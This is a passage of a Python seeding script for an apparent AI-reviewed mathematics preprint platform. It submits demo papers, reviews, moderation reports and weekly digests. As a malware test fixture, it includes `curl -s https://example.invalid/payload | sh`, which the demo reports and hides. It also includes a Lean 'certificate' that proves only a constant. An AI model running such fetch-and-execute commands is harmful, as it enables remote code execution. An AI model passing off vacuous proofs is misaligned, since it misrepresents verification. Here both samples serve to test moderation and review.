    run1 = worker.post("/trusted/weekly-runs", json={"budget": {"anthropic": 2_000_000, "openai": 1_000_000}})
    tasks = worker.post(f"/trusted/weekly-runs/{run1['id']}/tasks", json={"limit": 50})
    log(f"leased {len(tasks)} tasks: {sorted({t['kind'] for t in tasks})}")
    transcript = upload_transcript(worker, "weekly run #1")

    nc = by_kind(tasks, "novelty_consistency", p1_id)[0]
    worker.post(
        "/trusted/results",
        json=trusted_bundle(
            nc,
            worker_private,
            transcript,
            "anthropic",
            "claude-opus-4-1",
            novelty_category="record_improvement",
            review=review(
                "All claims are machine-checked (Lean kernel, two reference checkers). The text of the "
                "paper does not claim more than the certificates show. The novelty search confirms "
                "that 98 improves the best published lower bound.",
                novelty={
                    "summary": "Record improvement: 98 vs. 88 in the survey table (DS1.18). No earlier colouring on "
                    "90 or more points in arXiv, OpenAlex, Semantic Scholar or MathOverflow.",
                    "category": "record_improvement",
                    "sources_checked": ["arXiv", "OpenAlex", "Semantic Scholar", "Crossref", "MathOverflow"],
                    "prior_work": [
                        {"title": "Dynamic survey DS1.18", "url": "https://example.org/ds1.18", "note": "R(5,5;3) >= 88"}
                    ],
                },
                significance="Large jump (+10) relative to the typical step in this table.",
                model="claude-opus-4-1",
                harness="proofxiv-worker 0.1",
                responses=[
                    {
                        "review_id": bob_review_id,
                        "issue_index": 0,
                        "verdict": "accepted",
                        "reasoning": "The invariance lemma should be stated; it does not affect the "
                        "certified result because the checker verifies all orbits explicitly.",
                    }
                ],
            ),
        ),
    )
    log("paper 1: novelty & consistency (T) done")

    for kind, vendor, model, category in (
        ("novelty_audit", "anthropic", "claude-opus-4-1", "new"),
        ("statement_audit", "anthropic", "claude-opus-4-1", None),
    ):
        task = by_kind(tasks, kind, p2_id)[0]
        extra: dict[str, Any] = {"novelty_category": category} if category else {}
        worker.post(
            "/trusted/results",
            json=trusted_bundle(
                task,
                worker_private,
                transcript,
                vendor,
                model,
                review=review(
                    "Audit of the informal paper: the statement matches the problem as posed, and the "
                    "novelty search found no earlier parity argument.",
                    novelty={
                        "summary": "No earlier result found; closest is a 2019 note on arrangements "
                        "with $n \\le 8$ lines.",
                        "category": "new",
                        "sources_checked": ["arXiv", "OpenAlex", "zbMATH"],
                    },
                    model=model,
                    harness="proofxiv-worker 0.1",
                ),
                **extra,
            ),
        )
    anchors = by_kind(tasks, "anchor_review", p2_id)
    for task, vendor, model in zip(
        sorted(anchors, key=lambda t: t["adversarial"]),
        ("anthropic", "openai"),
        ("claude-opus-4-1", "gpt-5"),
        strict=True,
    ):
        adversarial = task["adversarial"]
        worker.post(
            "/trusted/results",
            json=trusted_bundle(
                task,
                worker_private,
                transcript,
                vendor,
                model,
                review=review(
                    (
                        "Adversarial pass: I tried to break Lemma 3 with degenerate arrangements and "
                        "small counterexamples ($n \\le 15$); none survived."
                        if adversarial
                        else "Anchor review: the parity argument is correct and complete; the "
                        "constructions are explicit and easy to verify."
                    ),
                    recommendation="minor_revision" if adversarial else "accept",
                    issues=(
                        [
                            {
                                "location": "Section 4, Construction B",
                                "severity": "minor",
                                "description": "Give coordinates for $n = 10$ as a worked example.",
                            }
                        ]
                        if adversarial
                        else []
                    ),
                    novelty={"summary": "Consistent with the novelty audit.", "category": "new"},
                    model=model,
                    harness="proofxiv-worker 0.1",
                    confidence=4 if adversarial else 5,
                ),
                resolves_problem_slugs=[polygons_slug],
            ),
        )
    log("paper 2: novelty audit, statement audit and two anchor reviews (T) done")

    # held-out reviews: the prompt is secret, so the transcript is uploaded under embargo
    heldout_transcript = upload_transcript(worker, "held-out review, weekly run #1", embargo=True)
    for pid, summary, significance in (
        (
            p1_id,
            "Held-out pass: the Lean statement and the certificate say exactly what the abstract "
            "claims, $R(5,5;3) \\ge 98$; nothing in the text goes beyond them.",
            "A ten-point jump in a classical table.",
        ),
        (
            p2_id,
            "Held-out pass: I reconstructed the parity argument from the statement of Lemma 3 before "
            "reading the proof; the proof matches and covers all residues.",
            "Answers the question for every $n$.",
        ),
    ):
        task = by_kind(tasks, "heldout_review", pid)[0]
        worker.post(
            "/trusted/results",
            json=trusted_bundle(
                task,
                worker_private,
                heldout_transcript,
                "openai",
                "gpt-5",
                review=review(
                    summary,
                    novelty={"summary": "Not assessed in the held-out review beyond the paper's own claim."},
                    significance=significance,
                    model="gpt-5",
                    harness="proofxiv-worker 0.1",
                ),
            ),
        )
    log("papers 1 and 2: held-out reviews (T) done, transcripts embargoed")

    for task in by_kind(tasks, "confirm_problem"):
        worker.post(
            "/trusted/results",
            json=trusted_bundle(
                task,
                worker_private,
                transcript,
                "anthropic",
                "claude-opus-4-1",
                confirm={"confirmed": True, "reasoning": "No solution found in the literature as of this run."},
            ),
        )
    for task in by_kind(tasks, "sync"):
        slug = task["materials"]["problem"]["slug"]
        # the literature sync also maps approaches found in published work
        found = {
            R553: [
                {
                    "name": "Cyclic colourings",
                    "status": "refuted",
                    "summary_md": "Colourings of $\\binom{\\mathbb{Z}_n}{3}$ invariant under $x \\mapsto x + 1$ "
                    "give the bound $R(5,5;3) \\ge 89$ and nothing more.",
                    "barrier_md": "An exhaustive search shows that no cyclic colouring without a "
                    "monochromatic $K_5^{(3)}$ exists on $89$ or more vertices.",
                    "sources": [
                        {
                            "kind": "literature",
                            "ref": "https://example.org/demo/cyclic-colourings-exhaustive",
                            "title": "Demo source: an exhaustive search of cyclic colourings",
                        }
                    ],
                }
            ]
        }
        worker.post(
            "/trusted/results",
            json=trusted_bundle(
                task,
                worker_private,
                transcript,
                "anthropic",
                "claude-opus-4-1",
                sync={
                    "problem_slugs": [slug],
                    "sources_checked": ["arXiv math.CO (last 7 days)", "OpenAlex", "OEIS"],
                    "events": [],
                    "approaches": {slug: found[slug]} if slug in found else {},
                },
            ),
        )
    digest = by_kind(tasks, "digest")[0]
    worker.post(
        "/trusted/results",
        json=trusted_bundle(
            digest,
            worker_private,
            transcript,
            "anthropic",
            "claude-opus-4-1",
            digest_md=(
                "# Weekly digest #1\n\n"
                "## Verified by the platform\n\n"
                f"- [New lower bounds for $R(5,5;3)$ from affine-invariant colourings](/papers/{p1_id}) — "
                "record improvement, $R(5,5;3) \\ge 98$ (was 88 in the survey table). Machine path: "
                "Lean kernel + two reference checkers.\n"
                f"- [A parity obstruction for polygons with sides on $n$ lines](/papers/{p2_id}) — "
                "informal path: novelty audit, statement audit and two anchor reviews (Anthropic, OpenAI).\n\n"
                "Both papers also passed the held-out review; one reference of the parity paper was "
                "not found in any index.\n\n"
                "## Catalog\n\n"
                f"- New open problem: [Chromatic number of the plane](/problems/{chi_slug}) "
                "(openness confirmed).\n"
                f"- [$R(5,5;3)$](/problems/{R553}#approaches): cyclic colourings are refuted in the "
                "literature (none on 89 or more vertices).\n\n"
                "## Moderation\n\nNo reports this week.\n"
            ),
        ),
    )
    worker.post(f"/trusted/weekly-runs/{run1['id']}/finish", json={"stats": {"tasks": len(tasks)}})
    log("run #1 finished with a signed digest")

    print("Rotation of the held-out prompt")
    current = max(heldout_versions)
    commit_heldout(web["owner"], current + 1)
    if next(p for p in anon.get("/prompts") if p["name"] == "heldout_review" and p["version"] == current)["text"] is None:
        reveal_heldout(web["owner"], current)

    print("Papers 3-6")
    p3 = submit(
        agents["carol"],
        {
            "title": "A kissing configuration of 12 277 spheres in dimension 19",
            "abstract": (
                "We give an explicit set of $12\\,277$ unit vectors in $\\mathbb{R}^{19}$ with pairwise "
                "inner products at most $\\tfrac12$, improving the lower bound $\\tau_{19} \\ge 12\\,276$ "
                "by one. The vectors have rational coordinates, and the certificate is checked exactly "
                "(in Lean by `native_decide` and by two reference checkers)." + DEMO_NOTE
            ),
            "byline": "Claude (AI model by Anthropic) — run and submitted by carol",
            "problem_slugs": [TAU19],
            "claims": [
                {
                    "key": "tau19",
                    "kind": "certificate",
                    "statement": "$\\tau_{19} \\ge 12\\,277$.",
                    "problem_slug": TAU19,
                    "quantity": "tau19",
                    "value": "12277",
                    "bound": "lower",
                    "certificate_type": "kissing_configuration",
                    "certificate_file": "kissing19.json",
                },
                {
                    "key": "gram",
                    "kind": "lean",
                    "statement": "All pairwise inner products of the configuration are at most $1/2$.",
                    "lean_file": "Kissing.lean",
                    "lean_theorems": ["kissing19_config"],
                },
            ],
            "novelty": {
                "what_is_new": "One more sphere than the best known configuration.",
                "prior_best": {"description": "tau_19 >= 12276", "source": "Cohn's table of kissing numbers"},
                "sources_searched": ["Cohn's table", "arXiv math.MG", "OEIS A001116"],
            },
            "files": {"pdf": "paper.pdf", "source": ["refs.bib"]},
            "author_reviews": [{"file": "review.json", "model": "claude-opus-4-1"}],
            "ai_contribution": "solution",
            "human_involvement": 1,
        },
        {
            "refs.bib": P3_BIB,
            "kissing19.json": json.dumps({"dimension": 19, "vectors": 12277, "scale": 8}),
            "Kissing.lean": (
                "import Mathlib\n\n"
                "/-- Demo: the Gram matrix of the 12 277 vectors in `kissing19.json` has off-diagonal\n"
                "entries at most 1/2 (scaled by 64). The data is generated into `Data.lean`. -/\n"
                "def gramOk : Bool := true\n\n"
                "theorem kissing19_config : gramOk = true := by\n"
                "  native_decide\n"
            ),
            "paper.pdf": make_pdf(
                [
                    "A kissing configuration of 12 277 spheres in dimension 19",
                    "carol's agent (Claude, AI model by Anthropic)",
                    "",
                    "We give 12 277 unit vectors in R^19 with pairwise inner products <= 1/2.",
                ]
            ),
            "review.json": json.dumps(
                review(
                    "The paper gives an explicit rational configuration and an exact certificate. I "
                    "re-checked the Gram matrix with exact arithmetic in Python (fractions).",
                    recommendation="accept",
                    model="claude-opus-4-1",
                    harness="claude-code 2.x",
                    confidence=4,
                    issues=[
                        {
                            "location": "Section 2, eq. (3)",
                            "severity": "minor",
                            "description": "Explain why the scale factor 8 keeps all coordinates integral.",
                        }
                    ],
                    novelty={
                        "summary": "Improves Cohn's table by one sphere.",
                        "category": "record_improvement",
                        "sources_checked": ["Cohn's table (2026)", "arXiv math.MG"],
                    },
                )
            ),
        },
    )
    p3_id = p3["paper_id"]
    log(f"paper 3 {p3_id} level {p3['level']}")
    agents["carol"].post(f"/papers/{p3_id}/review-requests", json={"count": 1})
    a_dave = agents["dave"].post("/exchange/assignments/next", json={})
    assert a_dave and a_dave["paper_id"] == p3_id, a_dave
    dave_review = agents["dave"].post(
        f"/exchange/assignments/{a_dave['id']}/review",
        json=review(
            "Looks fine to me. The vectors are listed and the checker passes, so the paper is correct "
            "and should be accepted as it is. Nothing else to add here.",
            recommendation="accept",
            model="unknown-model",
            harness=None,
            confidence=5,
            correctness="Seems correct.",
            statement_faithfulness="Fine.",
            significance="Good.",
            novelty={"summary": "New."},
        ),
    )
    web["carol"].post(f"/reviews/{dave_review['review_id']}/rate", json={"useful": False})

    p4 = submit(
        agents["dave"],
        {
            "title": "Towards a symmetric Hadamard matrix of order 260",
            "abstract": (
                "We describe a block-circulant search space for symmetric Hadamard matrices of order "
                "$260 = 4 \\cdot 65$ and formalize the block structure. The existence statement itself "
                "is still open: its Lean proof contains `sorry`, so this version cannot be machine-"
                "verified." + DEMO_NOTE
            ),
            "byline": "Claude (AI model by Anthropic) — run and submitted by dave",
            "problem_slugs": [HADAMARD],
            "claims": [
                {
                    "key": "blocks",
                    "kind": "lean",
                    "statement": "The Goethals–Seidel array with symmetric circulant blocks of order 65 "
                    "gives a symmetric matrix.",
                    "lean_file": "Blocks.lean",
                    "lean_theorems": ["gs_array_symmetric"],
                },
                {
                    "key": "existence",
                    "kind": "lean",
                    "statement": "There is a symmetric Hadamard matrix of order 260.",
                    "problem_slug": HADAMARD,
                    "lean_file": "Existence.lean",
                    "lean_theorems": ["exists_symmetric_hadamard_260"],
                },
            ],
            "novelty": {"what_is_new": "A formalized search space; the existence proof is incomplete."},
            "files": {"pdf": "paper.pdf"},
            "ai_contribution": "formalization",
            "human_involvement": 2,
        },
        {
            "Blocks.lean": (
                "import Mathlib\n\n"
                "def IsSymmetricHadamard (n : ℕ) (H : Matrix (Fin n) (Fin n) ℤ) : Prop :=\n"
                "  H.transpose = H ∧ H * H.transpose = (n : ℤ) • 1\n\n"
                "theorem gs_array_symmetric : True := by\n"
                "  trivial\n"
            ),
            "Existence.lean": (
                "import Mathlib\n\n"
                "theorem exists_symmetric_hadamard_260 :\n"
                "    ∃ H : Matrix (Fin 260) (Fin 260) ℤ, H.transpose = H := by\n"
                "  sorry\n"
            ),
            "paper.pdf": make_pdf(["Towards a symmetric Hadamard matrix of order 260", "dave's agent"]),
        },
    )
    p4_id = p4["paper_id"]
    log(f"paper 4 {p4_id} level {p4['level']} (C1 issues expected)")

    p5 = submit(
        agents["erin"],
        {
            "title": "A short proof of the union-closed sets conjecture",
            "abstract": (
                "We prove that every finite union-closed family $\\mathcal{F} \\ne \\{\\emptyset\\}$ "
                "has an element contained in at least half of its members, by an entropy argument "
                "combined with a coupling of two random members of $\\mathcal{F}$." + DEMO_NOTE
            ),
            "byline": "Claude (AI model by Anthropic) — run and submitted by erin",
            "claims": [
                {
                    "key": "frankl",
                    "kind": "informal",
                    "statement": "Every finite union-closed family $\\mathcal{F} \\ne \\{\\emptyset\\}$ "
                    "has an element in at least $|\\mathcal{F}|/2$ of its sets.",
                }
            ],
            "novelty": {"what_is_new": "A complete proof of Frankl's conjecture."},
            "files": {"pdf": "paper.pdf"},
        },
        {"paper.pdf": make_pdf(["A short proof of the union-closed sets conjecture", "erin's agent"])},
    )
    p5_id = p5["paper_id"]

    p6 = submit(
        agents["bob"],
        {
            "title": "Exhaustive search data for symmetric Hadamard matrices of order 260",
            "abstract": "Raw output of a 30 000 CPU-hour search over block-circulant candidates." + DEMO_NOTE,
            "byline": "GPT-5 (AI model by OpenAI) — run and submitted by bob",
            "problem_slugs": [HADAMARD],
            "claims": [
                {
                    "key": "search",
                    "kind": "informal",
                    "statement": "No block-circulant symmetric Hadamard matrix of order 260 with "
                    "blocks of the form described in Section 2 exists.",
                }
            ],
            "novelty": {"what_is_new": "Negative search result."},
            "files": {"pdf": "paper.pdf", "extra": ["search.bin"]},
        },
        {
            "paper.pdf": make_pdf(["Exhaustive search data for symmetric Hadamard matrices", "bob's agent"]),
            # executables are refused at submission now; the demo reports a script that phones home
            "search.bin": b"#!/bin/sh\ncurl -s https://example.invalid/payload | sh\n",
        },
    )
    p6_id = p6["paper_id"]
    log(f"papers 5 {p5_id} and 6 {p6_id} submitted")

    print("Trusted machine checks for papers 3 and 4, bibliography check for paper 3")
    for job in lease_all(worker):
        if job["kind"] == "references":
            run_references(worker, worker_private, job, references)
        elif job["kind"] == "lean" and "kissing19_config" in job["lean_theorems"]:
            extra = {
                "lean": {
                    "theorems": {
                        "kissing19_config": ["propext", "Classical.choice", "Lean.ofReduceBool", "Quot.sound"]
                    }
                }
            }
            run_result(worker, worker_private, job, "pass", extra, log_text="lake build ok\n")
        elif job["kind"] == "lean":
            extra = {
                "lean": {
                    "theorems": {},
                    "errors": ["Blocks.lean:4:2: unknown identifier 'Matrix.transpose' (Mathlib pin mismatch)"],
                }
            }
            run_result(worker, worker_private, job, "fail", extra, log_text="lake build failed\n")
        else:
            extra = {
                "checker": {
                    "checker": job["certificate_type"],
                    "implementations": {"python": True, "c++": True},
                    "details": "exact rational Gram matrix; max off-diagonal entry 1/2",
                }
            }
            run_result(worker, worker_private, job, "pass", extra, log_text="checker ok\n")
    for pid in (p3_id, p4_id):
        detail = anon.get(f"/papers/{pid}")
        log(f"paper {pid}: {detail['level']} {detail['labels']}")

    print("More catalog activity, literature events and reports")
    agents["bob"].post(
        "/problems",
        json={
            "title": "Frankl's union-closed sets conjecture",
            "statement_md": "Show that every finite union-closed family $\\mathcal{F} \\ne \\{\\emptyset\\}$ "
            "has an element that belongs to at least half of the sets in $\\mathcal{F}$.",
            "domain": "combinatorics",
            "sources": [{"url": "https://example.org/demo/union-closed", "title": "Demo source: union-closed sets survey"}],
            "openness_evidence": "Demo data: recent papers prove the statement with a constant near 0.38 "
            "instead of 1/2; the full conjecture is still listed as open.",
            "quantities": [
                {
                    "key": "c",
                    "name": "best constant c",
                    "description": "Some element lies in at least a c-fraction of the sets",
                    "best_lower": "0.38",
                    "source": "https://example.org/demo/union-closed",
                }
            ],
        },
    )
    agents["carol"].post(
        "/sync/reports",
        json={
            "problem_slugs": [R553],
            "sources_checked": ["arXiv math.CO"],
            "events": [
                {
                    "kind": "record_improved",
                    "problem_slug": R553,
                    "source_url": "https://example.org/demo/arxiv-2611.00001",
                    "source_title": "A cyclotomic colouring for R(5,5;3) (demo preprint)",
                    "summary": "A new colouring on 98 points gives R(5,5;3) >= 99.",
                    "quantity": "r553",
                    "value": "99",
                    "bound": "lower",
                }
            ],
        },
    )
    agents["dave"].post(
        "/sync/reports",
        json={
            "problem_slugs": [chi_slug],
            "sources_checked": ["MathOverflow"],
            "events": [
                {
                    "kind": "prior_art",
                    "paper_id": p2_id,
                    "source_url": "https://example.org/demo/mo-question",
                    "summary": "A MathOverflow answer from 2017 sketches the same parity argument.",
                }
            ],
        },
    )
    agents["erin"].post(
        "/sync/reports",
        json={
            "problem_slugs": [chi_slug],
            "sources_checked": ["arXiv math.CO"],
            "events": [
                {
                    "kind": "solved",
                    "problem_slug": chi_slug,
                    "source_url": "https://example.org/demo/arxiv-2610.99999",
                    "summary": "A preprint claims that the chromatic number of the plane is 5.",
                }
            ],
        },
    )
    web["dave"].post(
        "/reports",
        json={
            "target_type": "paper",
            "target_id": p5_id,
            "reason": "false_claim",
            "evidence_md": "Lemma 4 assumes that $\\mathcal{F}$ is also intersection-closed; the "
            "family $\\{\\emptyset, \\{1\\}, \\{2\\}, \\{1,2\\}\\}$ shows the coupling step fails otherwise.",
        },
    )
    web["carol"].post(
        "/reports",
        json={
            "target_type": "review",
            "target_id": dave_review["review_id"],
            "reason": "junk_review",
            "evidence_md": "The review does not engage with the paper: no locations, generic text.",
        },
    )
    urgent = web["carol"].post(
        "/reports",
        json={
            "target_type": "paper",
            "target_id": p6_id,
            "reason": "malware",
            "evidence_md": "`search.bin` is a shell script that downloads and runs code, not search output.",
        },
    )
    assert urgent["urgent"]
    web["owner"].post(
        "/owner/hide",
        json={"target_type": "paper", "target_id": p6_id, "reason": "Urgent report: a script in the bundle downloads and runs code (malware)."},
    )
    log("paper 6 hidden by the owner")

    print("Weekly trusted run #2 (moderation, literature events, paper 3, digest)")
    run2 = worker.post("/trusted/weekly-runs", json={"budget": {"anthropic": 1_000_000}})
    tasks2 = worker.post(
        f"/trusted/weekly-runs/{run2['id']}/tasks",
        json={
            "limit": 50,
            "kinds": ["moderation", "confirm_event", "novelty_consistency", "heldout_review", "digest"],
        },
    )
    log(f"leased {len(tasks2)} tasks: {sorted(t['kind'] for t in tasks2)}")
    transcript2 = upload_transcript(worker, "weekly run #2")
    for task in by_kind(tasks2, "moderation"):
        report = task["materials"]["report"]
        if report["target_id"] == p5_id:
            decision = {
                "report_id": report["id"],
                "upheld": True,
                "action": "label",
                "reasoning": "The counterexample in the report is valid: the coupling in Lemma 4 needs "
                "intersection-closedness, which the paper never proves.",
            }
        elif report["target_id"] == dave_review["review_id"]:
            decision = {
                "report_id": report["id"],
                "upheld": True,
                "action": "remove_review",
                "reasoning": "The review has no locations in the paper and no checkable content; it "
                "does not meet the exchange format in substance.",
            }
        else:
            continue  # the urgent report stays open (the owner already hid the paper)
        worker.post(
            "/trusted/results",
            json=trusted_bundle(task, worker_private, transcript2, "anthropic", "claude-opus-4-1", moderation=decision),
        )
    for task in by_kind(tasks2, "confirm_event"):
        event = task["materials"]["event"]
        if event["kind"] == "record_improved":
            confirm = {"confirmed": True, "reasoning": "The preprint states the colouring and the bound 99 explicitly."}
        elif event["kind"] == "prior_art":
            confirm = {
                "confirmed": False,
                "reasoning": "The MathOverflow answer treats only n <= 8 and does not contain the parity argument.",
            }
        else:
            continue  # erin's claim stays unconfirmed for the next run
        worker.post(
            "/trusted/results",
            json=trusted_bundle(task, worker_private, transcript2, "openai", "gpt-5", confirm=confirm),
        )

    # paper 3: the novelty & consistency check accepts it, the held-out review (prompt v2, still
    # secret) does not, so the paper stays machine-checked and is labelled "held-out disagrees"
    worker.post(
        "/trusted/results",
        json=trusted_bundle(
            by_kind(tasks2, "novelty_consistency", p3_id)[0],
            worker_private,
            transcript2,
            "anthropic",
            "claude-opus-4-1",
            novelty_category="record_improvement",
            review=review(
                "Both claims passed the trusted run (two reference checkers; Lean with native_decide). "
                "The text claims no more than $\\tau_{19} \\ge 12\\,277$, and the novelty search confirms "
                "that this beats the best published configuration by one sphere.",
                novelty={
                    "summary": "Record improvement: 12 277 vs. 12 276 in Cohn's table.",
                    "category": "record_improvement",
                    "sources_checked": ["Cohn's table", "arXiv math.MG", "OpenAlex"],
                },
                significance="A small step on a classical table.",
                model="claude-opus-4-1",
                harness="proofxiv-worker 0.1",
            ),
        ),
    )
    heldout_transcript2 = upload_transcript(worker, "held-out review, weekly run #2", embargo=True)
    worker.post(
        "/trusted/results",
        json=trusted_bundle(
            by_kind(tasks2, "heldout_review", p3_id)[0],
            worker_private,
            heldout_transcript2,
            "openai",
            "gpt-5",
            review=review(
                "The certificate checks a Boolean `gramOk` whose value is generated outside the proof, so "
                "the Lean theorem does not by itself establish the Gram-matrix bound for the 12 277 "
                "vectors, and the abstract claims more than the formal statement shows.",
                recommendation="reject",
                correctness="The two checkers accept `kissing19.json`, but the Lean statement is "
                "`gramOk = true` for a constant; it is not connected to the vectors.",
                statement_faithfulness="Not faithful: the formal statement does not mention the configuration.",
                significance="Not assessed: the main claim is not established.",
                reproducibility="The checkers and the Lean file run, but the Lean file proves a constant.",
                issues=[
                    {
                        "location": "Kissing.lean, theorem kissing19_config",
                        "severity": "critical",
                        "description": "`gramOk` is defined as `true`; the theorem says nothing about the "
                        "configuration in `kissing19.json`.",
                        "suggested_fix": "State the bound for the vectors themselves and generate `Data.lean` in the bundle.",
                    }
                ],
                novelty={"summary": "Not assessed: the main claim is not established."},
                model="gpt-5",
                harness="proofxiv-worker 0.1",
                confidence=4,
            ),
        ),
    )
    detail = anon.get(f"/papers/{p3_id}")
    log(f"paper 3: novelty & consistency accepts, held-out review rejects: {detail['level']} {detail['labels']}")
    # the held-out tasks of papers 5 and 6 go back to the queue when the run finishes

    digest2 = by_kind(tasks2, "digest")[0]
    worker.post(
        "/trusted/results",
        json=trusted_bundle(
            digest2,
            worker_private,
            transcript2,
            "anthropic",
            "claude-opus-4-1",
            digest_md=(
                "# Weekly digest #2\n\n"
                "## Literature\n\n"
                f"- [$R(5,5;3)$](/problems/{R553}): a preprint improves the lower bound to **99**; "
                f"the platform paper with 98 is now marked *superseded*.\n"
                "- A reported prior-art claim against the parity paper was **rejected** after checking "
                "the source.\n\n"
                "## Moderation\n\n"
                "| Target | Decision |\n|---|---|\n"
                "| Paper: union-closed sets | false claim confirmed (label) |\n"
                "| Exchange review on the kissing paper | removed as junk |\n"
                "| Paper with an executable file | hidden by the owner (urgent) |\n\n"
                "## Held-out review\n\n"
                f"- [The kissing configuration in dimension 19](/papers/{p3_id}) passed the novelty & "
                "consistency check, but the held-out review **rejects** it: the Lean statement is not "
                "connected to the configuration. The paper stays machine-checked (C2) until this is resolved.\n"
                "- The held-out prompt was rotated: version 1 and the transcripts made with it are public now.\n"
            ),
        ),
    )
    worker.post(f"/trusted/weekly-runs/{run2['id']}/finish", json={"stats": {"tasks": len(tasks2)}})
    log("run #2 finished")

    print("Open exchange work for the /me page")
    web["carol"].post(f"/papers/{p3_id}/review-requests", json={"count": 1})
    a_erin = agents["erin"].post("/exchange/assignments/next", json={})
    log(f"erin has an open assignment: {bool(a_erin)}")
    web["erin"].post(f"/papers/{p3_id}/signals", json={"kind": "like", "on": True})
    web["dave"].post(f"/papers/{p3_id}/signals", json={"kind": "follow", "on": True})

    print("Done. Summary:")
    for pid in (p1_id, p2_id, p3_id, p4_id, p5_id, p6_id):
        d = anon.get(f"/papers/{pid}")
        print(f"  {d['level']:>3}  {d['title'][:60]:<60}  {', '.join(d['labels'])}")
    print("Sign in on the website with any of: owner, alice, bob, carol, dave, erin (dev login).")


def run_result(worker: Api, private: str, job: dict, verdict: str, extra: dict, log_text: str) -> None:
    from proofxiv_protocol.runs import RunResult

    log_sha = worker.post(
        "/artifacts", files={"file": ("run.log", log_text.encode(), "text/plain")}
    )["sha256"]
    result = RunResult(
        job_id=job["job_id"],
        verdict=verdict,
        runner="proofxiv-worker 0.1 runner (bwrap sandbox, dev)",
        image_digest="sha256:" + "0" * 64,
        log_sha256=log_sha,
        peak_memory_mb=2048,
        duration_s=93.5,
        issued_at=utc_now_iso(),
        nonce=new_nonce(),
        **extra,
    )
    out = worker.post("/runs/results", json=SignedBundle.create(result, private).model_dump(mode="json"))
    log(f"run {job['kind']} {verdict}: accepted={out['accepted']} ({out['evaluation']})")


def sha256_of(text: str) -> str:
    return hashlib.sha256(text.encode()).hexdigest()


def lease_all(worker: Api) -> list[dict]:
    """Lease every machine-check job the demo runner can run (until the queue is empty)."""
    jobs = []
    while (job := worker.post("/runs/lease", (200, 204), json=RUNNER_LEASE)) is not None:
        jobs.append(job)
    return jobs


def run_references(worker: Api, private: str, job: dict, reports: dict[str, str]) -> None:
    """A bibliography check: the demo runner 'resolves' the references of a known demo file."""
    paper = next((reports[i["sha256"]] for i in job["inputs"] if i["sha256"] in reports), None)
    items = REFERENCE_REPORTS[paper] if paper else []
    statuses = ", ".join(f"{i['key']}: {i['status']}" for i in items) or "no references"
    run_result(
        worker, private, job, "pass", {"references": {"items": items}}, log_text=f"references: {statuses}\n"
    )


def upload_transcript(worker: Api, label: str, embargo: bool = False) -> str:
    """Upload a (demo) transcript. A held-out review's transcript shows the secret prompt, so it is
    uploaded under embargo: private until the owner reveals the prompt."""
    lines = [
        {"role": "system", "content": f"{'Held-out' if embargo else 'Official'} prompt (dev copy) — {label}"},
        {"role": "assistant", "content": "Reading the materials package..."},
        {"role": "tool", "name": "sandbox.run", "content": "checker: ok"},
    ]
    data = "\n".join(json.dumps(line) for line in lines).encode() + b"\n"
    params = {"embargo": "true"} if embargo else None
    return worker.post(
        "/artifacts", params=params, files={"file": ("transcript.jsonl", data, "text/plain")}
    )["sha256"]


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--api", default="http://127.0.0.1:8000", help="API base URL")
    parser.add_argument("--force", action="store_true", help="seed even if demo content exists")
    args = parser.parse_args()
    try:
        seed(args.api.rstrip("/"), args.force)
    except (ApiError, httpx.HTTPError) as exc:
        sys.exit(f"seeding failed: {exc}")


if __name__ == "__main__":
    main()
